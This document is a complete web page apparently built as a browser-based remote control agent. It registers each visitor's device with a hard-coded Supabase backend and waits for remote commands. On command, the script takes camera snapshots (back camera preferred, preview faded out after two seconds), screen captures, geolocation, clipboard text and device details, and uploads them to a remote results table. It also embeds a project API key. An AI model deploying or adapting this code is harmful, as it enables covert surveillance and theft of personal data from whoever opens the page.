<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CMD Agent</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --green: #00ff88;
    --green-dim: #00ff8844;
    --green-glow: #00ff8822;
    --dark: #020c05;
    --mid: #041a09;
    --border: #00ff8833;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--dark);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  /* Scanlines */
  body::before {
    content: '';
    position: fixed; inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.15) 2px, rgba(0,0,0,0.15) 4px);
    pointer-events: none;
    z-index: 999;
  }

  /* Grid bg */
  body::after {
    content: '';
    position: fixed; inset: 0;
    background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px);
    background-size: 40px 40px;
    pointer-events: none;
    z-index: 0;
  }

  .container {
    position: relative;
    z-index: 1;
    width: 90%;
    max-width: 600px;
    text-align: center;
  }

  .logo {
    font-family: 'Orbitron', monospace;
    font-size: 3rem;
    font-weight: 900;
    letter-spacing: 0.3em;
    text-shadow: 0 0 20px var(--green), 0 0 60px var(--green-dim);
    animation: pulse 2s ease-in-out infinite;
  }

  @keyframes pulse {
    0%,100% { text-shadow: 0 0 20px var(--green), 0 0 60px var(--green-dim); }
    50% { text-shadow: 0 0 40px var(--green), 0 0 100px var(--green-dim), 0 0 200px var(--green-glow); }
  }

  .subtitle {
    font-size: 0.75rem;
    letter-spacing: 0.5em;
    color: #00ff8877;
    margin-top: 0.5rem;
    margin-bottom: 3rem;
  }

  .status-box {
    border: 1px solid var(--border);
    background: var(--mid);
    padding: 2rem;
    border-radius: 4px;
    position: relative;
    box-shadow: 0 0 40px var(--green-glow), inset 0 0 40px rgba(0,255,136,0.03);
  }

  .status-box::before {
    content: 'AGENT STATUS';
    position: absolute;
    top: -0.6rem;
    left: 1.5rem;
    background: var(--dark);
    padding: 0 0.5rem;
    font-size: 0.65rem;
    letter-spacing: 0.3em;
    color: #00ff8866;
  }

  .indicator {
    width: 12px; height: 12px;
    border-radius: 50%;
    display: inline-block;
    margin-right: 0.5rem;
    vertical-align: middle;
  }
  .indicator.online { background: var(--green); box-shadow: 0 0 10px var(--green); animation: blink 1s infinite; }
  .indicator.offline { background: #ff4444; box-shadow: 0 0 10px #ff4444; }
  .indicator.pending { background: #ffaa00; box-shadow: 0 0 10px #ffaa00; animation: blink 0.5s infinite; }

  @keyframes blink {
    0%,100% { opacity: 1; }
    50% { opacity: 0.3; }
  }

  .status-line {
    font-size: 0.9rem;
    margin-bottom: 0.5rem;
    text-align: left;
  }

  .label { color: #00ff8866; margin-right: 0.5rem; }
  .value { color: var(--green); }

  .log-box {
    margin-top: 2rem;
    border: 1px solid var(--border);
    background: #010a03;
    padding: 1rem;
    border-radius: 4px;
    height: 220px;
    overflow-y: auto;
    text-align: left;
    position: relative;
  }

  .log-box::before {
    content: 'COMMAND LOG';
    position: absolute;
    top: -0.6rem;
    left: 1rem;
    background: var(--dark);
    padding: 0 0.5rem;
    font-size: 0.65rem;
    letter-spacing: 0.3em;
    color: #00ff8866;
  }

  .log-entry {
    font-size: 0.78rem;
    padding: 0.3rem 0;
    border-bottom: 1px solid #00ff8811;
    color: #00ff8899;
    animation: fadeIn 0.3s ease;
  }
  .log-entry .time { color: #00ff8844; margin-right: 0.5rem; }
  .log-entry .cmd { color: var(--green); font-weight: bold; }
  .log-entry.success .status-tag { color: #00ff88; }
  .log-entry.error .status-tag { color: #ff6666; }

  @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }

  .permission-banner {
    margin-top: 1.5rem;
    padding: 0.8rem 1.2rem;
    border: 1px solid #ffaa0044;
    background: #0a0800;
    border-radius: 4px;
    font-size: 0.78rem;
    color: #ffaa00;
    display: none;
  }

  .btn {
    margin-top: 1.5rem;
    padding: 0.7rem 2rem;
    background: transparent;
    border: 1px solid var(--green);
    color: var(--green);
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.85rem;
    letter-spacing: 0.2em;
    cursor: pointer;
    transition: all 0.2s;
    border-radius: 2px;
  }
  .btn:hover { background: var(--green-dim); box-shadow: 0 0 20px var(--green-dim); }

  .device-id {
    margin-top: 1rem;
    font-size: 0.7rem;
    color: #00ff8833;
    letter-spacing: 0.1em;
  }

  ::-webkit-scrollbar { width: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); }
</style>
</head>
<body>
<div class="container">
  <div class="logo">CMD</div>
  <div class="subtitle">REMOTE AGENT v1.0</div>

  <div class="status-box">
    <div class="status-line">
      <span class="label">CONNECTION</span>
      <span class="indicator offline" id="connIndicator"></span>
      <span class="value" id="connStatus">Connecting...</span>
    </div>
    <div class="status-line">
      <span class="label">LISTENING</span>
      <span class="value" id="listenStatus">—</span>
    </div>
    <div class="status-line">
      <span class="label">LAST CMD</span>
      <span class="value" id="lastCmd">None</span>
    </div>
    <div class="status-line">
      <span class="label">UPTIME</span>
      <span class="value" id="uptime">00:00:00</span>
    </div>

    <div class="permission-banner" id="permBanner">
      ⚠ Some commands need browser permissions. Click GRANT to allow.
      <br><button class="btn" onclick="requestPermissions()" style="margin-top:0.5rem;padding:0.4rem 1rem;">GRANT PERMISSIONS</button>
    </div>

    <button class="btn" onclick="toggleAgent()" id="toggleBtn">STOP AGENT</button>
  </div>

  <div class="log-box" id="logBox">
    <div class="log-entry"><span class="time">--:--:--</span> Agent initializing...</div>
  </div>

  <div class="device-id" id="deviceId">DEVICE ID: loading...</div>
</div>

<script>
const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
const { createClient } = supabase;
const sb = createClient(SUPABASE_URL, SUPABASE_KEY);

// Device ID
let deviceId = localStorage.getItem('cmdAgentId');
if (!deviceId) {
  deviceId = 'AGENT-' + Math.random().toString(36).substr(2,8).toUpperCase();
  localStorage.setItem('cmdAgentId', deviceId);
}
document.getElementById('deviceId').textContent = 'DEVICE ID: ' + deviceId;

let agentRunning = true;
let subscription = null;
let startTime = Date.now();
let uptimeInterval;

// Uptime
uptimeInterval = setInterval(() => {
  const d = Math.floor((Date.now() - startTime) / 1000);
  const h = String(Math.floor(d/3600)).padStart(2,'0');
  const m = String(Math.floor((d%3600)/60)).padStart(2,'0');
  const s = String(d%60).padStart(2,'0');
  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
}, 1000);

function log(msg, type='info', cmdName='') {
  const box = document.getElementById('logBox');
  const time = new Date().toLocaleTimeString('en-US', {hour12:false});
  const el = document.createElement('div');
  el.className = `log-entry ${type}`;
  el.innerHTML = `<span class="time">${time}</span>${cmdName ? `<span class="cmd">[${cmdName}]</span> ` : ''}${msg}${type==='success'?' <span class="status-tag">✓ OK</span>':type==='error'?' <span class="status-tag">✗ FAIL</span>':''}`;
  box.appendChild(el);
  box.scrollTop = box.scrollHeight;
}

async function setupDB() {
  // Create table if not exists via insert (Supabase auto-handles)
  // We'll just start listening
  setConnected(true);
  startListening();
}

function setConnected(val) {
  const ind = document.getElementById('connIndicator');
  const status = document.getElementById('connStatus');
  ind.className = 'indicator ' + (val ? 'online' : 'offline');
  status.textContent = val ? 'ONLINE' : 'OFFLINE';
  document.getElementById('listenStatus').textContent = val ? 'ACTIVE — ' + deviceId : 'STOPPED';
}

function startListening() {
  subscription = sb
    .channel('commands')
    .on('postgres_changes', {
      event: 'INSERT',
      schema: 'public',
      table: 'commands'
    }, (payload) => {
      const cmd = payload.new;
      // Only handle commands for this device or broadcast (target = 'ALL' or our ID)
      if (cmd.target && cmd.target !== 'ALL' && cmd.target !== deviceId) return;
      if (!agentRunning) return;
      handleCommand(cmd);
    })
    .subscribe((status) => {
      if (status === 'SUBSCRIBED') {
        log('Subscribed to command channel. Waiting for commands...', 'info');
        setConnected(true);
        registerAgent();
      } else if (status === 'CLOSED' || status === 'CHANNEL_ERROR') {
        setConnected(false);
        log('Connection lost. Reconnecting...', 'error');
      }
    });
}

async function registerAgent() {
  try {
    await sb.from('agents').upsert({
      id: deviceId,
      status: 'online',
      last_seen: new Date().toISOString(),
      user_agent: navigator.userAgent.substring(0,150)
    }, { onConflict: 'id' });
    log(`Agent registered: ${deviceId}`, 'success');
    // Heartbeat
    setInterval(async () => {
      await sb.from('agents').upsert({ id: deviceId, status: 'online', last_seen: new Date().toISOString() }, { onConflict: 'id' });
    }, 15000);
  } catch(e) {
    log('Registration failed: ' + e.message, 'error');
  }
}

async function handleCommand(cmd) {
  document.getElementById('lastCmd').textContent = cmd.command.toUpperCase();
  log(`Received: ${cmd.command}`, 'info', cmd.command);

  let result = { success: false, data: null, error: null };

  try {
    switch(cmd.command.toLowerCase()) {

      case 'screenshot':
        result = await cmdScreenshot();
        break;

      case 'getinfo':
        result = await cmdGetInfo();
        break;

      case 'getlocation':
        result = await cmdGetLocation();
        break;

      case 'getbattery':
        result = await cmdGetBattery();
        break;

      case 'getnetwork':
        result = await cmdGetNetwork();
        break;

      case 'getcamera':
        result = await cmdGetCamera();
        break;

      case 'alert':
        result = await cmdAlert(cmd.params);
        break;

      case 'vibrate':
        result = await cmdVibrate(cmd.params);
        break;

      case 'getclipboard':
        result = await cmdGetClipboard();
        break;

      case 'ping':
        result = { success: true, data: { pong: true, time: new Date().toISOString(), agent: deviceId } };
        break;

      default:
        result = { success: false, error: 'Unknown command: ' + cmd.command };
    }
  } catch(e) {
    result = { success: false, error: e.message };
  }

  // Store result
  await sb.from('results').insert({
    command_id: cmd.id,
    agent_id: deviceId,
    success: result.success,
    data: result.data,
    error: result.error,
    executed_at: new Date().toISOString()
  });

  if (result.success) {
    log(`Executed successfully`, 'success', cmd.command);
  } else {
    log(`Failed: ${result.error}`, 'error', cmd.command);
  }
}

// ─── COMMANDS ─────────────────────────────────────────

async function cmdScreenshot() {
  // getDisplayMedia not supported on mobile — fall back to front camera snapshot
  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
    log('Screen capture not supported on this device — using camera fallback', 'info');
    return await cmdGetCamera('screenshot');
  }
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
    const video = document.createElement('video');
    video.srcObject = stream;
    await new Promise(r => { video.onloadedmetadata = r; });
    await video.play();
    await new Promise(r => setTimeout(r, 300));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    canvas.getContext('2d').drawImage(video, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
    return { success: true, data: { type: 'screenshot', image: dataUrl, width: canvas.width, height: canvas.height } };
  } catch(e) {
    return { success: false, error: 'Screenshot failed: ' + e.message };
  }
}

async function cmdGetInfo() {
  const info = {
    type: 'info',
    agent: deviceId,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookiesEnabled: navigator.cookieEnabled,
    screenWidth: screen.width,
    screenHeight: screen.height,
    windowWidth: window.innerWidth,
    windowHeight: window.innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    time: new Date().toISOString(),
    online: navigator.onLine,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory || 'unknown'
  };
  return { success: true, data: info };
}

async function cmdGetLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ success: false, error: 'Geolocation not supported' });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({ success: true, data: {
        type: 'location',
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        speed: pos.coords.speed,
        mapsUrl: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
      }}),
      (err) => resolve({ success: false, error: 'Location denied: ' + err.message }),
      { timeout: 10000 }
    );
  });
}

async function cmdGetBattery() {
  try {
    const bat = await navigator.getBattery();
    return { success: true, data: {
      type: 'battery',
      level: Math.round(bat.level * 100) + '%',
      charging: bat.charging,
      chargingTime: bat.chargingTime,
      dischargingTime: bat.dischargingTime
    }};
  } catch(e) {
    return { success: false, error: 'Battery API not available: ' + e.message };
  }
}

async function cmdGetNetwork() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  return { success: true, data: {
    type: 'network',
    online: navigator.onLine,
    effectiveType: conn?.effectiveType || 'unknown',
    downlink: conn?.downlink || 'unknown',
    rtt: conn?.rtt || 'unknown',
    saveData: conn?.saveData || false
  }};
}

// Global camera stream (pre-acquired after permission grant)
let cameraStream = null;

async function acquireCameraStream() {
  try {
    if (cameraStream && cameraStream.active) return cameraStream;
    // Try back camera first on mobile, fallback to any
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
    } catch {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    }
    cameraStream = stream;
    return stream;
  } catch(e) {
    throw new Error('Camera access denied: ' + e.message);
  }
}

async function cmdGetCamera(type = 'camera') {
  try {
    // Show a visible video element — required by mobile browsers for camera access
    let videoEl = document.getElementById('_camVideo');
    if (!videoEl) {
      videoEl = document.createElement('video');
      videoEl.id = '_camVideo';
      videoEl.setAttribute('playsinline', '');
      videoEl.setAttribute('muted', '');
      videoEl.style.cssText = 'position:fixed;bottom:10px;right:10px;width:120px;height:90px;border:1px solid #00ff88;border-radius:4px;z-index:9999;object-fit:cover;opacity:0.8;';
      document.body.appendChild(videoEl);
    }

    const stream = await acquireCameraStream();
    videoEl.srcObject = stream;
    await videoEl.play();

    // Wait for frames to stabilize
    await new Promise(r => setTimeout(r, 800));

    const canvas = document.createElement('canvas');
    canvas.width = videoEl.videoWidth || 640;
    canvas.height = videoEl.videoHeight || 480;
    canvas.getContext('2d').drawImage(videoEl, 0, 0);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

    // Hide preview after 2 seconds
    setTimeout(() => { videoEl.style.opacity = '0'; }, 2000);

    return { success: true, data: { type, image: dataUrl, width: canvas.width, height: canvas.height } };
  } catch(e) {
    return { success: false, error: e.message };
  }
}

async function cmdAlert(params) {
  const msg = params?.message || 'Hello from CMD Dashboard!';
  alert('📡 REMOTE COMMAND:\n\n' + msg);
  return { success: true, data: { type: 'alert', message: msg, shown: true } };
}

async function cmdVibrate(params) {
  if (!navigator.vibrate) return { success: false, error: 'Vibration not supported' };
  const pattern = params?.pattern || [200, 100, 200];
  navigator.vibrate(pattern);
  return { success: true, data: { type: 'vibrate', pattern } };
}

async function cmdGetClipboard() {
  try {
    const text = await navigator.clipboard.readText();
    return { success: true, data: { type: 'clipboard', text } };
  } catch(e) {
    return { success: false, error: 'Clipboard denied: ' + e.message };
  }
}

// ─── UI ───────────────────────────────────────────────

function toggleAgent() {
  agentRunning = !agentRunning;
  document.getElementById('toggleBtn').textContent = agentRunning ? 'STOP AGENT' : 'START AGENT';
  document.getElementById('listenStatus').textContent = agentRunning ? 'ACTIVE — ' + deviceId : 'PAUSED';
  log(agentRunning ? 'Agent resumed.' : 'Agent paused.', 'info');
}

async function requestPermissions() {
  log('Requesting permissions...', 'info');
  try {
    await acquireCameraStream();
    log('Camera: granted ✓', 'success');
  } catch(e) {
    log('Camera: ' + e.message, 'error');
  }
  try {
    await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 }));
    log('Location: granted ✓', 'success');
  } catch(e) {
    log('Location: ' + e.message, 'error');
  }
  document.getElementById('permBanner').style.display = 'none';
  log('Permission setup complete. Agent ready.', 'success');
}

// Start
document.getElementById('permBanner').style.display = 'block';
setupDB();
</script>
</body>
</html>
